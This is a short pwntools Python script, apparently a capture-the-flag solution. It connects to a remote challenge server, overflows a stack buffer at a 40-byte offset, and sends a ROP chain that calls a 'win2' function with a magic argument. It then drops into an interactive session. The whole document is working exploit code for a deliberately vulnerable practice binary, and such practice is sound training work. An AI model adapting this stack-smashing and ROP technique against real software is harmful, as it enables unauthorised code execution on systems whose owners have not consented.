from pwn import *

context.arch = 'amd64'

elf = context.binary = ELF('old/sigsegv')
p = remote('nc.ctf.unitedctf.ca', 4000)
# p = elf.process()
offset = 40

rop = ROP([elf])
rop.call("win2", [0x1337133713371337, 0])

payload = flat({
    offset: rop.chain()
})

p.recvuntil(b"it's stack smashing time: ")
log.info(f"sending payload {payload}")
p.sendline(payload)

print(p.recv())

p.interactive()
